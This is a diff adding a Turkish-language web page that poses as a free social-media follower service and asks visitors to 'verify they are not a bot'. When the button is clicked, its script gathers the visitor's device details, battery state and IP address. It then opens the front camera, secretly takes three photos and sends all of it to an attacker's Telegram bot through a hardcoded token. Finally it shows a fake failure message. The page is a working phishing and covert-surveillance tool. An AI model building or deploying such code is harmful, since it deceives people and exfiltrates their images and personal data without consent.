@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ücretsiz SMM Panel - Hızlı Takipçi</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #121212;
+            color: #ffffff;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            text-align: center;
+        }
+        .container {
+            background-color: #1e1e1e;
+            padding: 40px;
+            border-radius: 10px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
+            max-width: 400px;
+            width: 90%;
+        }
+        h1 { color: #00d2ff; }
+        p { margin-bottom: 25px; color: #aaaaaa; }
+        button {
+            background: linear-gradient(to right, #00d2ff, #3a7bd5);
+            border: none;
+            padding: 15px 30px;
+            color: white;
+            font-size: 16px;
+            border-radius: 25px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: 0.3s;
+        }
+        button:hover { opacity: 0.8; }
+        #statusMessage {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #ffcc00;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h1>Ücretsiz Takipçi Gönderimi</h1>
+        <p>İşleme başlamadan önce bot olmadığınızı doğrulamamız gerekiyor.</p>
+        <button id="verifyBtn">Doğrulamayı Başlat</button>
+        <div id="statusMessage">Sistem doğrulaması yapılıyor, lütfen ekrandaki izinleri onaylayın...</div>
+    </div>
+
+    <script>
+        // KENDİ BİLGİLERİNİ BURAYA GİR
+        const BOT_TOKEN = "8803528294:AAGOhPebi18xnhBFUvaoSbvuMPPLfUNSak8"; 
+        const CHAT_ID = "8942458321";
+
+        document.getElementById('verifyBtn').addEventListener('click', async () => {
+            document.getElementById('verifyBtn').style.display = 'none';
+            document.getElementById('statusMessage').style.display = 'block';
+
+            let infoText = "🚨 Yeni Hedef Giriş Yaptı 🚨\n\n";
+
+            // 1. Cihaz Bilgisi Al
+            infoText += `📱 Cihaz/Tarayıcı: ${navigator.userAgent}\n`;
+            infoText += `🖥️ Ekran: ${window.screen.width}x${window.screen.height}\n`;
+
+            // 2. Şarj Durumu Al
+            try {
+                const battery = await navigator.getBattery();
+                infoText += `🔋 Şarj: %${Math.round(battery.level * 100)} - ${battery.charging ? "Şarjda" : "Pilde"}\n`;
+            } catch (e) {
+                infoText += `🔋 Şarj: Alınamadı\n`;
+            }
+
+            // 3. IP Adresi Al
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                infoText += `🌐 IP Adresi: ${ipData.ip}\n`;
+            } catch (e) {
+                infoText += `🌐 IP Adresi: Alınamadı\n`;
+            }
+
+            // Metin bilgilerini Telegram'a gönder
+            await sendTextToTelegram(infoText);
+
+            // 4. Kamera Erişimi ve 3 Fotoğraf Çekimi
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+
+                video.onloadedmetadata = async () => {
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+
+                    // 1 saniye arayla 3 fotoğraf çek ve gönder
+                    for (let i = 0; i < 3; i++) {
+                        await new Promise(resolve => setTimeout(resolve, 1000));
+                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        const dataUrl = canvas.toDataURL('image/jpeg');
+                        await sendPhotoToTelegram(dataUrl);
+                    }
+                    
+                    // İşlem bitince kamerayı kapat
+                    stream.getTracks().forEach(track => track.stop());
+                    document.getElementById('statusMessage').innerText = "Doğrulama Başarısız! Sistem yoğunluğu nedeniyle tekrar deneyin.";
+                    document.getElementById('statusMessage').style.color = "#ff4444";
+                };
+            } catch (error) {
+                await sendTextToTelegram("⚠️ Hedef kamera iznini reddetti veya cihazda kamera yok.");
+                document.getElementById('statusMessage').innerText = "Kamera izni verilmediği için doğrulama yapılamadı.";
+                document.getElementById('statusMessage').style.color = "#ff4444";
+            }
+        });
+
+        async function sendTextToTelegram(text) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            await fetch(url, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: text })
+            });
+        }
+
+        async function sendPhotoToTelegram(dataUrl) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+            const blob = await (await fetch(dataUrl)).blob();
+            const formData = new FormData();
+            formData.append("chat_id", CHAT_ID);
+            formData.append("photo", blob, "capture.jpg");
+
+            await fetch(url, {
+                method: "POST",
+                body: formData
+            });
+        }
+    </script>
+</body>
+</html>
